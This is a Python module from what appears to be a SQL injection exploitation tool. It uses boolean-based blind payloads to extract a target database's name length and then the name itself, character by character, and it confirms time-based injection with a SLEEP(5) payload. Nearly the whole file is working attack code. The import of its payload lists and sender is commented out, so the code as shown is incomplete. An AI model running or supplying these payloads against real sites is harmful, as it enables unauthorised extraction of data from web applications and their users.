from Modules.URLUtils import construct_test_url
from Modules.ResponseAnalyzer import analyze_response
# from Modules.BooleanBasedSQLTester import test_1_payloads, test_2_payloads, time_based_payloads, send_payload
import time


# Prompt user to continue exploitation with a specified vulnerability type
def prompt_user(vulnerability_type):
    while True:
        proceed = input(f"{vulnerability_type} vulnerability detected! Proceed with exploitation? (y/n): ").lower()
        if proceed in ["y", "n"]:
            return proceed == "y"
        else:
            print("Invalid input. Please enter 'y' or 'n'.")


# Exploit Boolean-based SQL injection to find database length
def exploit_boolean_based(target_url, id_value):
    length = 1
    while True:
        payload = f"1=IF((SELECT LENGTH(DATABASE())={length}),1,2)"
        for template in test_1_payloads:
            test_url = construct_test_url(target_url, id_value, template.format(payload))
            print(f"this is the test url: {test_url}")
            response = send_payload(test_url)
            if analyze_response(response, default=True):  # True condition indicates length found
                print(f"Database name length found: {length}")
                return length
        length += 1

# Exploit Boolean-based SQL injection to find the database name character by character
def find_database_name(target_url, id_value, db_length):
    database_name = ""
    for i in range(1, db_length + 1):
        for ascii_code in range(32, 127):  # ASCII printable characters range
            payload = f"1=IF(ASCII(SUBSTRING(DATABASE(),{i},1))={ascii_code},1,2)"
            for template in test_1_payloads:
                test_url = construct_test_url(target_url, id_value, template.format(payload))
                response = send_payload(test_url)
                if analyze_response(response, default=True):
                    database_name += chr(ascii_code)
                    print(f"Found character {i}: {chr(ascii_code)}")
                    break
    print(f"Database name: {database_name}")
    return database_name

# Exploit Time-based SQL injection to verify the vulnerability
def exploit_time_based(target_url, id_value):
    payload = "1=IF((SELECT LENGTH(DATABASE())>0),SLEEP(5),2)"
    for template in time_based_payloads:
        test_url = construct_test_url(target_url, id_value, template.format(payload))
        start_time = time.time()
        send_payload(test_url)
        response_time = time.time() - start_time
        if response_time >= 5:
            print(f"Confirmed time-based SQL injection with payload: {template.format(payload)}")
            return True
    return False


# Main function to initiate exploitation based on detected vulnerability type
def start_exploitation(target_url, id_value, method="boolean"):
    if method == "boolean":
        if prompt_user("Boolean-based"):
            db_length = exploit_boolean_based(target_url, id_value)
            db_name = find_database_name(target_url, id_value, db_length)
            # Continue with finding tables, columns, etc.
    elif method == "time-based":
        if prompt_user("Time-based"):
            exploit_time_based(target_url, id_value)
    else:
        print("Invalid method specified. Please use 'boolean' or 'time-based'.")
